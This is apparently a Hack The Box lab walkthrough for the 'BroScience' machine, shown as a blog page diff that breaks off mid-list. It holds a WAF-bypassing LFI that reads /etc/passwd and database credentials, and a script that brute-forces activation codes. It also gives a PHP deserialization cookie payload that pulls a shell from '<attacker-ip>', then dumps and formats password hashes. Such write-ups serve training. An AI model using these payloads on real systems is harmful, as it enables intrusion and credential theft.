@@ -1,0 +1,531 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <title>HTB - BroScience [Medium] // MeowMeowAttack&#39;s security.log</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.08c75f03335e384efd6114f8f43e0cfe7b8782f807f0ffcad6fd48c7431e850e.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - BroScience [Medium]"/>
+<meta name="twitter:description" content="Scannings &gt; TARGET=10.129.94.18 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.54 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to https://broscience."/>
+
+    <meta property="og:title" content="HTB - BroScience [Medium]" />
+<meta property="og:description" content="Scannings &gt; TARGET=10.129.94.18 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.54 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to https://broscience." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/broscience/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2023-01-09T08:40:32+13:00" />
+<meta property="article:modified_time" content="2023-01-09T08:40:32+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/contact/">/contact</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">/about</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/support/">/support</a>
+      </nav>
+      <p>MeowMeow is a pentest meow, a full of justice meow, and a nonsense-free meow. b******t, just filling this up for better SEO.</p>
+      <a style="font-size: smaller;" href="/privacy/">Privacy Policy</a>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="meowmeowattack" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">HTB - BroScience [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 9, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          9 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="scannings">Scannings</h2>
+<pre tabindex="0"><code>&gt; TARGET=10.129.94.18 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.54
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to https://broscience.htb/
+|_http-server-header: Apache/2.4.54 (Debian)
+443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: BroScience : Home
+| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT/emailAddress=administrator@broscience.htb/localityName=Vienna
+| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT/emailAddress=administrator@broscience.htb/localityName=Vienna
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-07-14T19:48:36
+| Not valid after:  2023-07-14T19:48:36
+| MD5:   5328ddd62f3429d11d26ae8a68d86e0c
+| SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| tls-alpn: 
+|_  http/1.1
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_ssl-date: TLS randomness does not represent time
+Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><ul>
+<li>Domain: <code>broscience.htb</code></li>
+<li>Directory search (scanning http doesn&rsquo;t give any response, use https)</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u https://broscience.htb
+[03:20:21] 301 -  319B  - /images  -&gt;  https://broscience.htb/images/       
+[03:20:21] 200 -    2KB - /images/                                          
+[03:20:22] 200 -    2KB - /includes/                                        
+[03:20:22] 301 -  321B  - /includes  -&gt;  https://broscience.htb/includes/
+[03:20:22] 200 -    9KB - /index.php                                        
+[03:20:22] 200 -    9KB - /index.php/login/                                 
+[03:20:24] 301 -  323B  - /javascript  -&gt;  https://broscience.htb/javascript/
+[03:20:29] 200 -    2KB - /login.php                                        
+[03:20:30] 302 -    0B  - /logout.php  -&gt;  /index.php                       
+[03:20:33] 200 -  676B  - /manual/index.html                                
+[03:20:33] 301 -  319B  - /manual  -&gt;  https://broscience.htb/manual/       
+[03:20:51] 200 -    2KB - /register.php                                     
+[03:20:56] 403 -  280B  - /server-status/                                   
+[03:20:56] 403 -  280B  - /server-status                                    
+[03:21:03] 301 -  319B  - /styles  -&gt;  https://broscience.htb/styles/       
+[03:21:12] 200 -    1KB - /user.php
+
+&gt; dirsearch -u https://broscience.htb/includes/ -e php -f -x 403
+[03:33:09] 200 -  369B  - /includes/header.php                              
+[03:33:13] 200 -   39B  - /includes/img.php                                 
+[03:34:25] 200 -    0B  - /includes/utils.php
+</code></pre><ul>
+<li>Subdomain enum, nothing useful</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;https://broscience.htb/&#34; -H &#34;Host: FUZZ.broscience.htb&#34; --hl 146
+
+000002182:   200        22 L     125 W      2193 Ch     &#34;resource&#34;
+000002184:   200        22 L     125 W      2191 Ch     &#34;test01&#34;
+</code></pre><h2 id="web-enum">Web Enum</h2>
+<ul>
+<li>Browsing to <code>/includes/img.php</code> gives an error, it requires a <code>path</code> parameter</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -k https://broscience.htb/includes/img.php
+&lt;b&gt;Error:&lt;/b&gt; Missing &#39;path&#39; parameter.
+</code></pre><ul>
+<li>This looks promising for LFI, however, there seems to be a WAF</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -k https://broscience.htb/includes/img.php?path=../../../../etc/passwd  
+&lt;b&gt;Error:&lt;/b&gt; Attack detected.
+</code></pre><ul>
+<li>To bypass the WAF, use double url encoding, sometimes certain keywords are also filterd, so it&rsquo;s better to encode all characters including alphanumeric characters.</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../../../../etc/passwd))
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</code></pre><ul>
+<li>DB credential can be found</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../includes/db_connect.php))
+
+&lt;?php
+$db_host = &#34;localhost&#34;;
+$db_port = &#34;5432&#34;;
+$db_name = &#34;broscience&#34;;
+$db_user = &#34;dbuser&#34;;
+$db_pass = &#34;R***************7&#34;;
+$db_salt = &#34;NaCl&#34;;
+
+$db_conn = pg_connect(&#34;host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}&#34;);
+
+if (!$db_conn) {
+    die(&#34;&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database&#34;);
+}
+?&gt;
+</code></pre><ul>
+<li>Sending activation code is a missing feature</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../register.php))
+
+// TODO: Send the activation link to email
+$activation_link = &#34;https://broscience.htb/activate.php?code={$activation_code}&#34;;
+</code></pre><ul>
+<li>Learn how the activation code is generated</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../includes/utils.php))
+
+&lt;?php
+function generate_activation_code() {
+    $chars = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;;
+    srand(time());
+    $activation_code = &#34;&#34;;
+    for ($i = 0; $i &lt; 32; $i++) {
+        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+    }
+    return $activation_code;
+}
+</code></pre><h2 id="user-activation-timing-attack">User activation: timing attack</h2>
+<ul>
+<li>From reading the <code>generate_activation_code</code>, there is a chance for timing attack because the unix timestamp of the server is used as the seed for generating the activation code. We can write a php code to generate a range (-500 to +500 around the received server time of account creation) of activation codes then bruteforce it to activate the newly created account.</li>
+<li>Intercept the account register request in burpsuite and create a new account. Record the response time from the server. In the example here, the server response time is <code>Sun, 08 Jan 2023 09:17:21 GMT</code></li>
+</ul>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Date: Sun, 08 Jan 2023 09:17:21 GMT
+Server: Apache/2.4.54 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 2433
+Connection: close
+Content-Type: text/html; charset=UTF-8
+</code></pre><ul>
+<li>Create a php script and generate a range of activation codes</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generate_activation_code</span>($time) {
+</span></span><span style="display:flex;"><span>    $chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srand</span>($time);
+</span></span><span style="display:flex;"><span>    $activation_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $activation_code <span style="color:#f92672">=</span> $activation_code <span style="color:#f92672">.</span> $chars[<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">strlen</span>($chars) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $activation_code;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// find this from the above server response time
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ref_time <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;U&#34;</span>,<span style="color:#a6e22e">strtotime</span>(<span style="color:#e6db74">&#39;Sun, 08 Jan 2023 09:17:21 GMT&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($t <span style="color:#f92672">=</span> $ref_time <span style="color:#f92672">-</span> <span style="color:#ae81ff">500</span>; $t <span style="color:#f92672">&lt;=</span> $ref_time <span style="color:#f92672">+</span> <span style="color:#ae81ff">500</span>; $t<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">generate_activation_code</span>($t)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>Run the script and use <code>wfuzz</code> to find the correct activation code</li>
+</ul>
+<pre tabindex="0"><code>&gt; php activate.php &gt; codes.txt
+&gt; wfuzz -c -z file,codes.txt --hh 1256 https://broscience.htb/activate.php?code=FUZZ
+
+000000501:   200        27 L     65 W       1251 Ch     &#34;nbzQZMQa4GqWxdLutyjazolBDSGhobg0&#34;
+</code></pre><ul>
+<li>Now, the newly created account should be activated</li>
+</ul>
+<h2 id="foothold">Foothold</h2>
+<ul>
+<li>After login, note the cookie <code>user-prefs</code>, it&rsquo;s a base64 encoded php serialized string <code>O:9:&quot;UserPrefs&quot;:1:{s:5:&quot;theme&quot;;s:5:&quot;light&quot;;}</code>. This looks vulnerable to deserialization attacks, also evidented in <code>includes/utils.php</code>: <code>get_theme</code> reads the cookie and deserialize it, <code>Avatar</code> reads a file and save to local. So, we can utilise these to make the target read a shell script from us and then trigger the shell on the target.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># line 63
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_theme</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_COOKIE[<span style="color:#e6db74">&#39;user-prefs&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            $up_cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">UserPrefs</span>()));
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;user-prefs&#39;</span>, $up_cookie);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $up_cookie <span style="color:#f92672">=</span> $_COOKIE[<span style="color:#e6db74">&#39;user-prefs&#39;</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $up <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">base64_decode</span>($up_cookie));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $up<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">theme</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;light&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># line 95
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Avatar</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($imgPath) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span> <span style="color:#f92672">=</span> $imgPath;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save</span>($tmp) {
+</span></span><span style="display:flex;"><span>        $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>($f, <span style="color:#a6e22e">file_get_contents</span>($tmp));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($f);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AvatarInterface</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $tmp;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup() {
+</span></span><span style="display:flex;"><span>        $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Avatar</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>);
+</span></span><span style="display:flex;"><span>        $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">save</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmp</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>To exploit, create a php script to generate a malicious payload for the cookie</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Avatar</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($imgPath) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span> <span style="color:#f92672">=</span> $imgPath;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save</span>($tmp) {
+</span></span><span style="display:flex;"><span>        $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>($f, <span style="color:#a6e22e">file_get_contents</span>($tmp));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($f);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AvatarInterface</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&lt;attacker-ip&gt;/w.php&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./w.php&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup() {
+</span></span><span style="display:flex;"><span>        $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Avatar</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>);
+</span></span><span style="display:flex;"><span>        $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">save</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmp</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AvatarInterface</span>));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>Run the script and paste the value into the cookie <code>user-prefs</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; php shell.php
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNDoiaHR0cDovLzEwLjEwLjE2LjcwL3cucGhwIjtzOjc6ImltZ1BhdGgiO3M6NzoiLi93LnBocCI7fQ==
+</code></pre><ul>
+<li>Serve the script with http and refresh the browser. This will make the target load our shell script.</li>
+<li>Then setup a netcat listener and browse to <code>https://broscience.htb/w.php</code> to trigger the shell.</li>
+</ul>
+<h2 id="user-bill">User: bill</h2>
+<ul>
+<li>We have already obtained the db credentials from before. Login to db and get the user hashes</li>
+</ul>
+<pre tabindex="0"><code>$ psql -U dbuser -h localhost -W -d broscience
+Password:
+
+\dt;
+           List of relations
+ Schema |   Name    | Type  |  Owner   
+--------+-----------+-------+----------
+ public | comments  | table | postgres
+ public | exercises | table | postgres
+ public | users     | table | postgres
+(3 rows)
+
+select * from users;
+ id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
+----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
+  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
+  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
+  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
+  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
+  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
+(5 rows)
+</code></pre><ul>
+<li>These hashes are not directly crackable, read <code>/register.php</code> and see the following. The passwords are <code>salted</code> and luckily, we have the salt: <code>NaCl</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_execute</span>($db_conn, <span style="color:#e6db74">&#34;create_user_query&#34;</span>, <span style="color:#66d9ef">array</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>], <span style="color:#a6e22e">md5</span>($db_salt <span style="color:#f92672">.</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>]), $_POST[<span style="color:#e6db74">&#39;email&#39;</span>], $activation_code));
+</span></span></code></pre></div><ul>
+<li>Format the hashes like below</li>
+</ul>
+<pre tabindex="0"><code>15657792073e8a843d4f91f********1:NaCl
+13edad4932da9dbb57d9cd1********4:NaCl
+bd3dad50e2d578ecba87d5f********5:NaCl
+a7eed23a7be6fe0d765197b********e:NaCl
+5d15340bded5b9395d5d14b********b:NaCl
+</code></pre><ul>
